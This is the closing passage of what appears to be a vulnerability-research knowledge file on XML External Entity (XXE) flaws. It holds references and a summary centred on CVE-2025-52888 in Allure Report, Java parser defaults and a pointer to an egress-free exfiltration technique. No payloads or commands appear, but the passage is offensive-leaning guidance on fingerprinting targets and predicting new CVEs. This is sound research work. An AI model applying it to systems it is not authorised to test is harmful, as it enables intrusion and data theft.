- **Allure Report repository** — [github.com/allure-framework/allure2](https://github.com/allure-framework/allure2); the fix commit is publicly visible.
- **OWASP XML External Entity Prevention Cheat Sheet** — [cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html) — the canonical parser-hardening reference. The Allure patch DOES NOT follow this template; do not assume all patches do.
- **GoSecure local-DTD extraction technique** — historical writeup at [gosecure.net](https://www.gosecure.net); the base's Egress-Free Exfiltration section documents the technique.
- **HTTP Garden research** — [arXiv:2405.17737](https://arxiv.org/abs/2405.17737) — not XXE-specific but relevant for parser-differential class awareness (route to `http_request_smuggling.md`).
- **XML measurement scripts** — `.zen-batch-artifacts/batch-6-*/measurements/xml-parsers/` — the batch-6 measured parser-defaults matrix (Java/Python/.NET/PHP/Ruby/Node OOTB behavior).

The batch-6 XXE novel frontier is anchored by a single verified CVE (CVE-2025-52888) rather than the four-CVE dissection of path traversal; the depth of this file reflects that ratio and lands below the standard deep-sibling band on purpose, at genuine frontier depth without tangential surfaces padded to meet the count.

## Summary

The 2024–2026 XXE frontier is anchored by CVE-2025-52888 in the Allure Report plugin trio — a canonical Java-parser-defaults class expression at the CI/CD layer, notable for its narrower-than-OWASP patch shape (custom `ClasspathEntityResolver` rather than DOCTYPE-disable). The broader class remains active across the Java ecosystem via the `DocumentBuilderFactory.newInstance()` OOTB configuration and continues to surface in modern SSO stacks, LLM/MCP agent tooling, and any tool that instantiates multiple XML parsers independently. The class-generalization patterns (verified in the batch-6 measured matrix) predict where the next CVE will emerge. Fingerprint every target's XML-parser configuration independently; verify the specific patch shape rather than assuming OWASP-standard hardening; and distinguish CVE findings from class findings in reporting.
